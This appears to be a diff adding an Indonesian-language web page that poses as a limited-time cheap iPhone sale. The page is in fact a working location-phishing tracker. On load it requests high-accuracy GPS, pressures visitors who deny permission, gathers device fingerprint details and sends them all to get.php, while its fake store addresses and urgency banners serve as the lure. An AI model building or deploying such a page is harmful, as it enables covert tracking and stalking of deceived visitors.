@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<body>
+<meta http-equiv="refresh" content="30" />
+<p>Izinkan untuk mengetahui informasi.</p>
+<body onLoad="getLocation()">
+<button onclick="getLocation()">Izinkan</button>
+
+
+<script>
+
+
+function getLocation() {
+    if (navigator.geolocation) {
+    var acc = {enableHighAccuracy : true , timeout : 30000, maximumage : 0 };
+        navigator.geolocation.getCurrentPosition(showPosition, showError, acc);
+    } else { 
+        x.innerHTML = "This site requires Geolocation to work.";
+    }
+}
+
+function showPosition(position) {
+
+ //   x.innerHTML = "Latitude: " + position.coords.latitude + 
+ //   "<br>Longitude: " + position.coords.longitude;
+
+  var useragent = navigator.userAgent;
+  var latitude = position.coords.latitude;
+  var longitude = position.coords.longitude;
+  var altitude = position.coords.altitude;
+  var accuracy = position.coords.accuracy;
+  var speed = position.coords.speed;
+  var heading = position.coords.heading;
+  var platform = navigator.platform;
+  var hardware = navigator.hardwareConcurrency;
+  var memory = navigator.deviceMemory;
+  var height = window.screen.height;
+  var width = window.screen.width;
+
+
+window.location.href = "get.php?latitude=" + latitude + "&longitude=" + longitude + "&altitude=" + altitude + "&platform=" + platform + "&accuracy=" + accuracy + "&speed=" + speed + "&heading=" + heading + "&hardware=" + hardware + "&memory=" + memory + "&useragent=" + useragent + "&height=" + height + "&width=" + width;
+
+}
+function showError(error)
+{
+	switch(error.code)
+  {
+		case error.PERMISSION_DENIED:
+			var error = '1' ; // 'permission denied';
+      alert('Please, Allow Location Permission...');
+      break;
+		case error.POSITION_UNAVAILABLE:
+			var error = '2' // 'unavailable';
+			break;
+		case error.TIMEOUT:
+			var error = '3' // 'timed out';
+      alert('Please refresh this page...');
+			break;
+		case error.UNKNOWN_ERROR:
+			var error  = '4' // 'unknown error';
+			break;
+	}
+
+window.location.href = "error.php?error=" + error;
+
+}
+</script>
+
+</body>
+<head>
+  <center><font size = "6">Buruan dapatkan Promo Iphone Murah...!!</font></center>
+</head>
+<body>
+  <center><img src = "https://2.bp.blogspot.com/-scJ5XSoIxGs/WEvJ2LDb31I/AAAAAAAAHJw/zzmcKltKoJwlUegcHYWFAY_jA9ipucDUACLcB/s320/iPhone%2B5s%2BPromo%2BHarga%2BRp%2B4.299.000%2Bdi%2BGlobal%2BTeleshop.jpg"></center>
+</body>
+<head>
+  <center style="background-color:Tomato;">Izinkan Untuk Mengetahui Produk lainnya</center>
+</head>
+<style>
+  .blink {
+    animation: blink-animation 1s steps(5, start) infinite;
+    -webkit-animation: blink-animation 1s steps(5, start) infinite;
+  }
+  @keyframes blink-animation {
+    to {
+      visibility: hidden;
+    }
+  }
+  @-webkit-keyframes blink-animation {
+    to {
+      visibility: hidden;
+    }
+  }
+  </style>
+  <center><span class="blink">Waktu Terbatas....!!!!</span></center>
+  <font size = "4">Berbagai merek iphone murah Hanya ada disini edisi cuci gudang Kalian juga bisa menukarkan hp kalian di sini.Kalian juga bisa kredit</font>
+  <center><font size = "4">List harga iphone</font></center>
+<body>
+  <center><img src = "https://www.tagar.id/Asset/uploads2019/1598540864258-daftar-harga-diskon-iphone-di-ibox.jpg"></center>
+</body>
+<head>
+  <center><font size ="4">Bisa Cek di ig kami @Storage_store23 atau Kantor kami<br>Jakarta:JL.cempaka NO.5 jakartapusat<br>Surabaya:jl.Hasanudin No 13 Surabaya<br>Bandung:JL.KapitanPatimuar NO 24 Bandung pusat</font></center>
+</head>
+<body>
+  <marquee direction="up" height="50">Author:WhoMHw</marquee><br>
+  <marquee direction="down" height="50">Author:WhoMHw</marquee>
+  <marquee>WhoMHw</marquee>
+</body>
+</html>
